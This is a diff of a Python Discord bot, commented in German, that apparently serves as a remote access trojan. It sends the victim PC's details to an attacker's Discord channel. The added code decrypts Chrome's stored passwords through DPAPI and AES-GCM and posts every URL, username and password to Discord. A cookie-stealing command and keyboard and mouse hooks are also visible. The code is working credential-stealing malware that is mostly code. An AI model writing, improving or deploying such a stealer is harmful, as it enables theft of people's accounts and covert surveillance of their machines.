@@ -9,6 +9,8 @@ import screeninfo
 import mss
 import PIL
 import os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 import datetime
 import tempfile
 import shutil
@@ -54,7 +56,7 @@ from cryptography.hazmat.backends import default_backend
 from pynput import mouse, keyboard
 from win32crypt import CryptUnprotectData
 
-TOKEN = 'Dein Token'
+TOKEN = '<BOT_TOKEN>'
 MAX_FILE_SIZE = 7.5 * 1024 * 1024  # 7,5 MB in Bytes
 
 def is_admin():
@@ -159,20 +161,6 @@ async def on_ready():
     else:
         windows_version = "Nicht Windows"
 
-    # Anzahl der Bildschirme
-    number_of_screens = len(get_monitors())
-
-    # Verbindungstyp bestimmen
-    try:
-        network_adapters = psutil.net_if_addrs()
-        is_wifi = any("Wi-Fi" in adapter for adapter in network_adapters)
-        is_lan = any("Ethernet" in adapter for adapter in network_adapters)
-    except Exception:
-        is_wifi = False
-        is_lan = False
-
-    connection_type = "WLAN" if is_wifi else "LAN" if is_lan else "Unbekannt"
-
     # Webcam-Status prüfen
     try:
         webcam_enabled = cv2.VideoCapture(0).isOpened()
@@ -180,11 +168,16 @@ async def on_ready():
     except Exception:
         webcam_enabled = False
 
-    # VPN-Status (Dummy-Check, erweiterbar)
-    vpn_enabled = False
+    # VPN-Status prüfen (Dummy-Beispiel, erweiterbar)
+    try:
+        vpn_status = "VPN aktiv" if "tun" in psutil.net_if_stats() else "Kein VPN erkannt"
+    except Exception:
+        vpn_status = "VPN-Check fehlgeschlagen"
 
     # Discord-Kanal abrufen
-    channel = bot.get_channel(Deine Kanal ID)  # Kanal-ID anpassen
+    channel_id = <CHANNEL_ID> # Ersetzen Sie dies durch die tatsächliche Kanal-ID
+    channel = bot.get_channel(channel_id)
+
     if channel:
         embed = discord.Embed(
             title=f"PC-Status: {local_pc_name}",
@@ -195,12 +188,11 @@ async def on_ready():
         embed.add_field(name="IP-Adresse", value=local_ip_address, inline=False)
         embed.add_field(name="Dateiname", value=local_filename, inline=False)
         embed.add_field(name="Windows Version", value=windows_version, inline=False)
-        embed.add_field(name="Anzahl der Bildschirme", value=str(number_of_screens), inline=False)
         embed.add_field(name="Webcam", value="Ja" if webcam_enabled else "Nein", inline=False)
-        embed.add_field(name="Verbindung", value=connection_type, inline=False)
-        embed.add_field(name="VPN", value="Ja" if vpn_enabled else "Nein", inline=False)
+        embed.add_field(name="VPN", value=vpn_status, inline=False)
 
         await channel.send(embed=embed)
+
 
 @bot.command()
 async def test(ctx):
@@ -798,65 +790,122 @@ async def send_file(ctx, file_name, content):
     except Exception as e:
         await ctx.send(f"Fehler beim Erstellen oder Senden der Datei: {str(e)}")
 
-@bot.command()
-async def passwords(ctx):
+def get_encryption_key():
     try:
-        passwords_data = get_chrome_passwords()
-        if not passwords_data:
-            await ctx.send("Keine gespeicherten Passwörter gefunden.")
-        else:
-            file_name = "passwords.txt"
-            with open(file_name, "w", encoding="utf-8") as f:
-                for pwd in passwords_data:
-                    f.write(f"URL: {pwd['url']}\nBenutzername: {pwd['username']}\nPasswort: {pwd['password']}\n\n")
-            await ctx.send(file=discord.File(file_name))  # Sende die Datei an den Discord-Channel
-            os.remove(file_name)  # Lösche die Datei nach dem Versand
+        local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
+        with open(local_state_path, "r", encoding="utf-8") as file:
+            local_state = json.load(file)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
     except Exception as e:
-        await ctx.send(f"Fehler beim Abrufen der Passwörter: {str(e)}")
+        print(f"Fehler beim Abrufen des Verschlüsselungsschlüssels: {e}")
+        return None
 
-# Funktion, um Passwörter von Chrome zu extrahieren
+
+def decrypt_value(encrypted_value, key):
+    try:
+        if not encrypted_value or len(encrypted_value) < 5:
+            return "Kein gültiger verschlüsselter Wert"
+
+        if encrypted_value[:3] in (b"v10", b"v11"):
+            iv = encrypted_value[3:15]
+            payload = encrypted_value[15:-16]
+            tag = encrypted_value[-16:]
+            cipher = Cipher(
+                algorithms.AES(key),
+                modes.GCM(iv, tag),
+                backend=default_backend()
+            )
+            decryptor = cipher.decryptor()
+            return decryptor.update(payload) + decryptor.finalize()
+
+        return CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+    except Exception as e:
+        print(f"Fehler beim Entschlüsseln: {e}")
+        return "Entschlüsselung fehlgeschlagen"
+
+
+def copy_and_access_db(db_path):
+    try:
+        temp_path = os.path.join(os.getenv("TEMP"), "chrome_temp_db")
+        with open(db_path, "rb") as src, open(temp_path, "wb") as dst:
+            dst.write(src.read())
+        conn = sqlite3.connect(temp_path)
+        return conn, temp_path
+    except Exception as e:
+        print(f"Fehler beim Kopieren der Datenbank: {e}")
+        return None, None
+
+
 def get_chrome_passwords():
     passwords = []
-    try:
-        key = get_encryption_key()
-        login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
-        if os.path.exists(login_data_path):
-            conn, temp_path = copy_and_access_db(login_data_path)  # Datenbank öffnen
-            if conn:
+    key = get_encryption_key()
+    if not key:
+        return [{"url": "Schlüsselabruf fehlgeschlagen", "username": "", "password": ""}]
+
+    login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
+    if os.path.exists(login_data_path):
+        conn, temp_path = copy_and_access_db(login_data_path)
+        if conn:
+            try:
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                 rows = cursor.fetchall()
                 for row in rows:
                     url, username, encrypted_password = row
-                    password = decrypt_value(encrypted_password, key) if key else "Nicht entschlüsselbar"
-                    passwords.append({"url": url, "username": username, "password": password.decode('utf-8', errors='ignore')})
+                    
+                    if not encrypted_password:
+                        continue
+
+                    password = decrypt_value(encrypted_password, key)
+                    if password == "Entschlüsselung fehlgeschlagen":
+                        continue
+                    
+                    if not username and not password:
+                        continue
+
+                    passwords.append({
+                        "url": url,
+                        "username": username,
+                        "password": password.decode('utf-8', errors='ignore') if isinstance(password, bytes) else password
+                    })
+            except Exception as e:
+                print(f"Fehler beim Lesen der Datenbank: {e}")
+            finally:
                 conn.close()
-                os.remove(temp_path)  # Temporäre Kopie der DB löschen
-    except Exception as e:
-        passwords.append({"url": "Fehler", "username": "Fehler", "password": str(e)})
+                os.remove(temp_path)
+    else:
+        passwords.append({"url": "Datenbank nicht gefunden", "username": "", "password": ""})
     return passwords
 
-# Funktion zum Abrufen des Entschlüsselungsschlüssels
-def get_encryption_key():
-    try:
-        local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-        local_state = json.loads(local_state)
-        key = base64.b64decode(local_state["os_crypt"]["encryption_key"])
-        return key
-    except Exception as e:
-        return None
 
-# Funktion zum Entschlüsseln der Passwörter
-def decrypt_value(encrypted_value, key):
-    try:
-        cipher = Cipher(algorithms.AES(key), modes.GCM(encrypted_value[3:15]))
-        decryptor = cipher.decryptor()
-        return decryptor.update(encrypted_value[15:]).decode('utf-8', errors='ignore')
-    except Exception as e:
-        return "Entschlüsselung fehlgeschlagen"
+@bot.command()
+async def passwords(ctx, pc_name: str):
+    """
+    Befehl: !passwords [PC-Name]
+    Gibt alle gespeicherten Benutzernamen und Passwörter für den lokalen PC aus.
+    """
+    if pc_name.strip() != local_pc_name:
+        await ctx.send(f"Dieser Befehl ist nur für den PC `{local_pc_name}` verfügbar.")
+        return
 
+    passwords = get_chrome_passwords()
+    if passwords:
+        output = "Gefundene Passwörter:\n"
+        for entry in passwords:
+            output += f"URL: {entry['url']}\nBenutzername: {entry['username']}\nPasswort: {entry['password']}\n\n"
+        await ctx.send(f"```\n{output}\n```")
+    else:
+        await ctx.send("Keine Passwörter gefunden oder Zugriff verweigert.")
+
+if __name__ == "__main__":
+    passwords = get_chrome_passwords()
+    if passwords:
+        print("Gefundene Passwörter:")
+        for entry in passwords:
+            print(f"URL: {entry['url']}, Benutzername: {entry['username']}, Passwort: {entry['password']}")
+    else:
+        print("Keine Passwörter gefunden.")
 # Befehl, um Cookies abzurufen
 @bot.command()
 async def cookies(ctx, pc_name: str):
